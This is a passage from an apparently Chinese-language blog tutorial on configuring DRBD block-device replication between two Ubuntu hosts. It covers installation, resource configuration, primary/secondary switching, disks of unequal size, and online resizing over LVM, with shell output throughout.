43:64:51:B8:71:C1:53:C3:AE:29:64:EC:5F:B2:A3:30:54:25:F9:B5</span><br><span class="line">sig_hashalgo:   sha512</span><br><span class="line">signature:      0F:16:6D:12:54:0F:95:51:A5:18:4A:0A:A9:7C:72:F6:2D:31:21:39:</span><br><span class="line">                44:D9:71:C8:1B:7C:3F:1B:4B:66:53:08:1A:63:92:C3:CE:19:19:F0:</span><br><span class="line">                13:9F:9D:D6:7B:0B:27:F8:54:19:D3:44:F9:CC:8F:6E:E1:82:07:7A:</span><br><span class="line">                30:B1:37:28:5E:60:92:5B:C9:26:B0:25:DD:50:9D:A5:2E:76:96:A8:</span><br><span class="line">                E2:58:A1:36:DC:AA:84:D2:40:EF:66:F1:82:E5:2B:51:D7:F8:49:62:</span><br><span class="line">                9A:62:22:DC:42:A9:01:EC:6B:DC:9F:C6:8E:DD:9D:4A:CD:93:9B:F9:</span><br><span class="line">                3B:E4:4A:B4:34:BD:12:1A:89:C0:2C:2B:96:4D:86:27:D5:93:3A:51:</span><br><span class="line">                D4:DD:C7:34:9D:2D:A0:6C:BC:57:D1:9F:54:C2:55:56:B2:60:4D:FB:</span><br><span class="line">                86:55:18:09:9C:A5:C1:80:54:F5:F5:35:97:7E:32:36:A9:9B:F9:B2:</span><br><span class="line">                69:5B:BD:83:A3:41:89:9B:4F:7D:BA:A9:F1:E2:28:6A:FD:D4:7A:94:</span><br><span class="line">                67:34:D1:3C:8D:39:18:F7:43:A7:5F:67:71:B6:3B:63:3C:10:16:B7:</span><br><span class="line">                44:EA:D2:D4:52:19:28:F3:60:31:35:69:6B:EA:25:3B:35:FC:32:05:</span><br><span class="line">                B9:5A:99:7E:61:27:59:52:A8:55:8C:B6:15:8E:77:26:0F:DC:61:93:</span><br><span class="line">                F9:10:EA:8F:FD:E1:E0:DF:60:2D:83:92:9E:33:D7:99:10:93:AF:03:</span><br><span class="line">                44:8B:A0:6A:E8:E7:08:71:77:1C:CC:35:96:8C:94:DB:62:CA:ED:64:</span><br><span class="line">                B8:17:43:24:FD:BF:FC:3B:D7:D7:03:1C:83:06:0E:B5:D3:82:2A:4B:</span><br><span class="line">                E4:A7:F9:C4:07:9C:0F:2B:3E:D4:EA:48:FF:6E:BD:79:2E:85:FB:EE:</span><br><span class="line">                2D:A2:70:96:38:77:9C:29:58:5C:45:B1:8A:29:D2:7A:87:55:A6:A3:</span><br><span class="line">                32:A2:FC:F5:A2:4F:9C:20:85:F0:55:E6:A6:01:D2:76:EE:27:2F:A0:</span><br><span class="line">                BC:67:F2:B9:9B:A4:5D:2D:3D:6F:E9:46:C0:EF:4A:0C:01:15:19:E7:</span><br><span class="line">                9C:61:A9:00:E8:1A:D3:7D:2E:86:81:FD:BA:53:44:85:17:19:D9:B3:</span><br><span class="line">                B8:E2:7B:39:01:28:3E:F3:DF:87:3C:C5:E4:37:89:C1:67:16:B0:2C:</span><br><span class="line">                C7:4D:C8:6F:71:97:55:19:24:63:7B:D6:08:A2:EC:EB:C3:AA:71:91:</span><br><span class="line">                35:B4:C6:47:B5:EA:2B:DF:E4:AC:9C:06:77:73:1B:33:F5:AF:EE:58:</span><br><span class="line">                AC:F2:C4:A0:C9:00:58:AB:3F:62:1B:E5:E5:C3:E1:39:98:5B:2A:C9:</span><br><span class="line">                BD:10:6B:AF:FC:44:B0:7D:57:07:B0:5B</span><br><span class="line">parm:           allow_oos:DONT USE! (bool)</span><br><span class="line">parm:           disable_sendpage:bool</span><br><span class="line">parm:           proc_details:int</span><br><span class="line">parm:           minor_count:Approximate number of drbd devices (1-255) (uint)</span><br><span class="line">parm:           usermode_helper:string</span><br></pre></td></tr></table></figure>

<p>至于使用drbd的工具还是要安装的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~$ sudo apt-cache show drbd-utils</span><br><span class="line">Package: drbd-utils</span><br><span class="line">Architecture: arm64</span><br><span class="line">Version: 9.11.0-1build1</span><br><span class="line">Priority: extra</span><br><span class="line">Section: admin</span><br><span class="line">Origin: Ubuntu</span><br><span class="line">Maintainer: Ubuntu Developers &lt;ubuntu-devel-discuss@lists.ubuntu.com&gt;</span><br><span class="line">Original-Maintainer: Debian DRBD Maintainers &lt;debian-ha-maintainers@lists.alioth.debian.org&gt;</span><br><span class="line">Bugs: https://bugs.launchpad.net/ubuntu/+filebug</span><br><span class="line">Installed-Size: 2062</span><br><span class="line">Depends: lsb-base (&gt;= 3.0-6), libc6 (&gt;= 2.28), libgcc-s1 (&gt;= 3.0), libstdc++6 (&gt;= 5.2), init-system-helpers (&gt;= 1.51)</span><br><span class="line">Recommends: heirloom-mailx | mailx</span><br><span class="line">Suggests: heartbeat</span><br><span class="line">Breaks: drbd8-utils (&lt;&lt; 2:8.9.0)</span><br><span class="line">Replaces: drbd8-utils (&lt;&lt; 2:8.9.0)</span><br><span class="line">Filename: pool/main/d/drbd-utils/drbd-utils_9.11.0-1build1_arm64.deb</span><br><span class="line">Size: 654128</span><br><span class="line">MD5sum: 45a8962e941c9a87c7de423de34f616b</span><br><span class="line">SHA1: 3734ee6c0611348c5b8c080feb713c05f9d84c4c</span><br><span class="line">SHA256: ae63aa90d145faab00551f151c10588bafebe2673e64b137c980cce7c299bccf</span><br><span class="line">Homepage: https://www.drbd.org/</span><br><span class="line">Description-en: RAID 1 over TCP/IP for Linux (user utilities)</span><br><span class="line"> Drbd is a block device which is designed to build high availability</span><br><span class="line"> clusters by providing a virtual shared device which keeps disks in</span><br><span class="line"> nodes synchronised using TCP/IP. This simulates RAID 1 but avoiding</span><br><span class="line"> the use of uncommon hardware (shared SCSI buses or Fibre Channel).</span><br><span class="line"> It is currently limited to fail-over HA clusters.</span><br><span class="line"> .</span><br><span class="line"> This package contains the programs that will control the drbd kernel</span><br><span class="line"> module provided in the Linux kernel.</span><br><span class="line">Description-md5: 7da3dade742b03d1a9c08b339123f93b</span><br><span class="line"></span><br><span class="line">bob@ubu1:~$ apt install drbd-utils</span><br></pre></td></tr></table></figure>

<p>两个节点ubu1和ubu2都需要安装这个<code>drbd-utils</code>包</p>
<h1 id="常规用法"><a href="#常规用法" class="headerlink" title="常规用法"></a>常规用法</h1><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="配置-etc-drbd-d-global-common-conf"><a href="#配置-etc-drbd-d-global-common-conf" class="headerlink" title="配置/etc/drbd.d/global_common.conf"></a>配置<code>/etc/drbd.d/global_common.conf</code></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">global &#123;</span><br><span class="line">    usage-count yes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">common &#123;</span><br><span class="line">    net &#123;</span><br><span class="line">        protocol C;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>DRBD系统向虚拟块的镜像中写入数据时，支持三种协议</p>
<ul>
<li><code>protocol A</code> 数据一旦写入磁盘并发送到网络中就认为完成了写入操作</li>
<li><code>protocol B</code> 收到接收确认就认为完成了写入操作</li>
<li><code>protocol C</code> 收到写入确认就认为完成了写入操作</li>
</ul>
<p>基于安全考虑我们一般选择<code>protocol C</code></p>
<h3 id="配置DRBD资源-etc-drbd-d-r0-res"><a href="#配置DRBD资源-etc-drbd-d-r0-res" class="headerlink" title="配置DRBD资源/etc/drbd.d/r0.res"></a>配置DRBD资源<code>/etc/drbd.d/r0.res</code></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource r0 &#123;</span><br><span class="line">  on ubu1 &#123;</span><br><span class="line">      device    /dev/drbd1;</span><br><span class="line">      disk  /dev/sda;</span><br><span class="line">      address   192.168.64.2:7789;</span><br><span class="line">      meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">  on ubu2 &#123;</span><br><span class="line">      device    /dev/drbd1;</span><br><span class="line">      disk  /dev/sda;</span><br><span class="line">      address   192.168.64.4:7789;</span><br><span class="line">      meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>device</code>指drbd映射出来的快设备名称，<code>disk</code>指用于存放数据的硬盘。</p>
<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>分别在<code>ubu1</code>和<code>ubu2</code>上创建DRBD资源元数据</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~$ sudo drbdadm create-md r0</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu2:~$ sudo drbdadm create-md r0</span><br></pre></td></tr></table></figure>

<p>然后再启动<code>ubu1</code>和<code>ubu2</code>上的DRBD服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~$ sudo systemctl start drbd</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu2:~$ sudo systemctl start drbd</span><br></pre></td></tr></table></figure>

<p>启动<code>r0</code>资源，并设置<code>ubu1</code>为主设备</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~$ sudo drbdadm up r0</span><br><span class="line">bob@ubu1:~$ sudo drbdadm primary --force r0</span><br></pre></td></tr></table></figure>

<p>可以使用<code>drbdadm status r0</code>查看状态，也可以用<code>cat /proc/drbd</code>查看同步进度。<br>当<code>peer-disk</code>状态为<code>UpToDate</code>表示数据已经同步到最新状态。</p>
<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~$ sudo drbdadm status r0</span><br><span class="line">r0 role:Primary</span><br><span class="line">  disk:UpToDate</span><br><span class="line">  peer role:Secondary</span><br><span class="line">    replication:Established peer-disk:UpToDate</span><br></pre></td></tr></table></figure>

<p>如需查询服务状态详细信息可以通过命令<code>drbdsetup status r0 --verbose --statistics</code>查询</p>
<h2 id="文件系统常规使用"><a href="#文件系统常规使用" class="headerlink" title="文件系统常规使用"></a>文件系统常规使用</h2><p>首先通过<code>lsblk</code>查看<code>drbd1</code>快设备是否存在，然后格式化成xfs文件系统，并挂载到<code>/mnt</code>目录上</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop2                       7:2    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">loop3                       7:3    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop4                       7:4    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop5                       7:5    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop6                       7:6    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop7                       7:7    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop8                       7:8    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br><span class="line">bob@ubu1:~$ mkfs.xfs /dev/drbd1</span><br><span class="line">...</span><br><span class="line">bob@ubu1:~$ mount /dev/drbd1 /mnt</span><br><span class="line">bob@ubu1:~$ touch /mnt/hello</span><br></pre></td></tr></table></figure>

<h2 id="切换"><a href="#切换" class="headerlink" title="切换"></a>切换</h2><p>切换操作，可以认为是切换primary节点操作。需要先将ubu1(primary节点)设置成<code>secondary</code>，再将ubu2(secondary节点)设置成<code>primary</code>，然后ubu2节点就可以挂载<code>drbd1</code>快设备了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~$ sudo drbdadm secondary r0</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu2:~$ sudo drbdadm primary r0</span><br><span class="line">bob@ubu2:~$ sudo mount /dev/drbd1 /mnt/</span><br><span class="line">bob@ubu2:~$ df -h</span><br><span class="line">Filesystem                         Size  Used Avail Use% Mounted on</span><br><span class="line">udev                               1.9G     0  1.9G   0% /dev</span><br><span class="line">tmpfs                              392M  1.4M  391M   1% /run</span><br><span class="line">/dev/mapper/ubuntu--vg-ubuntu--lv   49G  7.3G   39G  16% /</span><br><span class="line">tmpfs                              2.0G     0  2.0G   0% /dev/shm</span><br><span class="line">tmpfs                              5.0M     0  5.0M   0% /run/lock</span><br><span class="line">tmpfs                              2.0G     0  2.0G   0% /sys/fs/cgroup</span><br><span class="line">/dev/vda2                          974M  206M  701M  23% /boot</span><br><span class="line">/dev/vda1                          511M  5.3M  506M   2% /boot/efi</span><br><span class="line">/dev/loop3                          60M   60M     0 100% /snap/core20/1826</span><br><span class="line">/dev/loop1                          50M   50M     0 100% /snap/core18/2681</span><br><span class="line">/dev/loop2                          58M   58M     0 100% /snap/core20/1332</span><br><span class="line">/dev/loop5                          92M   92M     0 100% /snap/lxd/24065</span><br><span class="line">/dev/loop4                          61M   61M     0 100% /snap/lxd/21843</span><br><span class="line">/dev/loop6                          44M   44M     0 100% /snap/snapd/17954</span><br><span class="line">tmpfs                              392M     0  392M   0% /run/user/1000</span><br><span class="line">/dev/drbd1                          20G  175M   20G   1% /mnt</span><br></pre></td></tr></table></figure>

<p>在将ubu1节点从primary状态设置成secondary状态时可能会遇到如下错误</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~$ sudo drbdadm secondary r0</span><br><span class="line">1: State change failed: (-12) Device is held open by someone</span><br><span class="line">env: python: No such file or directory</span><br></pre></td></tr></table></figure>
<p>这说明当前块设备<code>brbd1</code>正在被挂载或者被其他应用使用，可以使用<code>lsof</code>命令查看改设备的使用情况，并终止使用后再设置节点状态为<code>secondary</code>。</p>
<h1 id="硬盘容量大小不一致情况"><a href="#硬盘容量大小不一致情况" class="headerlink" title="硬盘容量大小不一致情况"></a>硬盘容量大小不一致情况</h1><p>当源和备硬盘容量大小不一致时，取最小容量做为drbd块设备对外提供的存储空间大小。</p>
<p>ubu1:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop3                       7:3    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop4                       7:4    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop5                       7:5    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop6                       7:6    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop7                       7:7    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   21G  0 disk</span><br><span class="line">└─drbd2                   147:2    0   21G  0 disk</span><br><span class="line">sdc                         8:32   0   31G  0 disk</span><br><span class="line">└─drbd3                   147:3    0   22G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br><span class="line">bob@ubu1:~$ cat /etc/drbd.d/r1.res</span><br><span class="line">resource r1 &#123;</span><br><span class="line">  on ubu1 &#123;</span><br><span class="line">    device    /dev/drbd2;</span><br><span class="line">    disk  /dev/sdb;</span><br><span class="line">    address   192.168.64.2:7792;</span><br><span class="line">    meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">  on ubu2 &#123;</span><br><span class="line">    device    /dev/drbd2;</span><br><span class="line">    disk  /dev/sdb;</span><br><span class="line">    address   192.168.64.4:7792;</span><br><span class="line">    meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">bob@ubu1:~$ cat /etc/drbd.d/r2.res</span><br><span class="line">resource r2 &#123;</span><br><span class="line">  on ubu1 &#123;</span><br><span class="line">    device    /dev/drbd3;</span><br><span class="line">    disk  /dev/sdc;</span><br><span class="line">    address   192.168.64.2:7793;</span><br><span class="line">    meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">  on ubu2 &#123;</span><br><span class="line">    device    /dev/drbd3;</span><br><span class="line">    disk  /dev/sdc;</span><br><span class="line">    address   192.168.64.4:7793;</span><br><span class="line">    meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">bob@ubu1:~$ cat /proc/drbd</span><br><span class="line">version: 8.4.11 (api:1/proto:86-101)</span><br><span class="line">srcversion: B438804C5AE8C84C95D0411</span><br><span class="line"></span><br><span class="line"> 1: cs:Connected ro:Secondary/Secondary ds:UpToDate/UpToDate C r-----</span><br><span class="line">    ns:0 nr:0 dw:0 dr:0 al:0 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0</span><br><span class="line"> 2: cs:Connected ro:Primary/Secondary ds:UpToDate/UpToDate C r-----</span><br><span class="line">    ns:22019388 nr:0 dw:0 dr:22021500 al:0 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0</span><br><span class="line"> 3: cs:Connected ro:Primary/Secondary ds:UpToDate/UpToDate C r-----</span><br><span class="line">    ns:23067932 nr:0 dw:0 dr:23070036 al:8 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0</span><br></pre></td></tr></table></figure>

<p>ubu2:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu2:~$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop3                       7:3    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">loop4                       7:4    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop5                       7:5    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop6                       7:6    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop7                       7:7    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   32G  0 disk</span><br><span class="line">└─drbd2                   147:2    0   21G  1 disk</span><br><span class="line">sdc                         8:32   0   22G  0 disk</span><br><span class="line">└─drbd3                   147:3    0   22G  1 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br></pre></td></tr></table></figure>

<h1 id="硬盘扩容情况"><a href="#硬盘扩容情况" class="headerlink" title="硬盘扩容情况"></a>硬盘扩容情况</h1><p>在ubu1上使用lvm构建底层硬盘存储数据，方便后续进行扩容操作。先创建一个20G的lv，然后创建drbd块设备，待同步完数据后对lv进行扩容10G操作，最后再对drbd进行扩容操作。(此间省略lvm相关操作)</p>
<p>ubu2上使用一个30G的scsi设备，不配置lvm，与ubu1上的lvm块设备构成一个异构环境。</p>
<p>ubu1:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~/drbd_res$ cat /etc/drbd.d/r1.res</span><br><span class="line">resource r1 &#123;</span><br><span class="line">  on ubu1 &#123;</span><br><span class="line">    device    /dev/drbd2;</span><br><span class="line">    disk  /dev/drbd-vg/drbdlv1;</span><br><span class="line">    address   192.168.64.2:7792;</span><br><span class="line">    meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">  on ubu2 &#123;</span><br><span class="line">    device    /dev/drbd2;</span><br><span class="line">    disk  /dev/sdb;</span><br><span class="line">    address   192.168.64.4:7792;</span><br><span class="line">    meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm create-md r1</span><br><span class="line">initializing activity log</span><br><span class="line">initializing bitmap (640 KB) to all zero</span><br><span class="line">Writing meta data...</span><br><span class="line">New drbd meta data block successfully created.</span><br><span class="line">success</span><br><span class="line">bob@ubu1:~/drbd_res$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop3                       7:3    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop4                       7:4    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop5                       7:5    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop6                       7:6    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop7                       7:7    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   21G  0 disk</span><br><span class="line">└─drbd--vg-drbdlv1        253:1    0   20G  0 lvm</span><br><span class="line">sdc                         8:32   0   31G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm up r1</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm primary --force r1</span><br><span class="line">bob@ubu1:~/drbd_res$ cat /proc/drbd</span><br><span class="line">version: 8.4.11 (api:1/proto:86-101)</span><br><span class="line">srcversion: B438804C5AE8C84C95D0411</span><br><span class="line"></span><br><span class="line"> 1: cs:Connected ro:Secondary/Secondary ds:UpToDate/UpToDate C r-----</span><br><span class="line">    ns:0 nr:0 dw:0 dr:0 al:0 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0</span><br><span class="line"> 2: cs:SyncSource ro:Primary/Secondary ds:UpToDate/Inconsistent C r-----</span><br><span class="line">    ns:14496 nr:0 dw:0 dr:16616 al:8 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:20956348</span><br><span class="line">        [&gt;....................] sync&#x27;ed:  0.1% (20464/20476)M</span><br><span class="line">        finish: 2:21:35 speed: 2,416 (2,416) K/sec</span><br></pre></td></tr></table></figure>

<p>ubu2:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu2:~$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop3                       7:3    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop4                       7:4    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop5                       7:5    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">loop6                       7:6    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop7                       7:7    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   32G  0 disk</span><br><span class="line">└─drbd2                   147:2    0   20G  1 disk</span><br><span class="line">sdc                         8:32   0   22G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br></pre></td></tr></table></figure>

<p>目前drbd2对外提供的是一个20G的硬盘，接下来在不停drbd复制链接的情况下对其扩容10G（同样，省略lvm相关操作）</p>
<p>ubu1:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~/drbd_res$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop3                       7:3    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop4                       7:4    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop5                       7:5    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop6                       7:6    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop7                       7:7    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   21G  0 disk</span><br><span class="line">└─drbd--vg-drbdlv1        253:1    0   30G  0 lvm</span><br><span class="line">  └─drbd2                 147:2    0   20G  0 disk</span><br><span class="line">sdc                         8:32   0   31G  0 disk</span><br><span class="line">└─drbd--vg-drbdlv1        253:1    0   30G  0 lvm</span><br><span class="line">  └─drbd2                 147:2    0   20G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm status r1</span><br><span class="line">r1 role:Primary</span><br><span class="line">  disk:UpToDate</span><br><span class="line">  peer role:Secondary</span><br><span class="line">    replication:SyncSource peer-disk:Inconsistent done:88.51</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm resize r1</span><br><span class="line">bob@ubu1:~/drbd_res$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop3                       7:3    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop4                       7:4    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop5                       7:5    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop6                       7:6    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop7                       7:7    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   21G  0 disk</span><br><span class="line">└─drbd--vg-drbdlv1        253:1    0   30G  0 lvm</span><br><span class="line">  └─drbd2                 147:2    0   30G  0 disk</span><br><span class="line">sdc                         8:32   0   31G  0 disk</span><br><span class="line">└─drbd--vg-drbdlv1        253:1    0   30G  0 lvm</span><br><span class="line">  └─drbd2                 147:2    0   30G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br></pre></td></tr></table></figure>

<p>ubu2:</p>
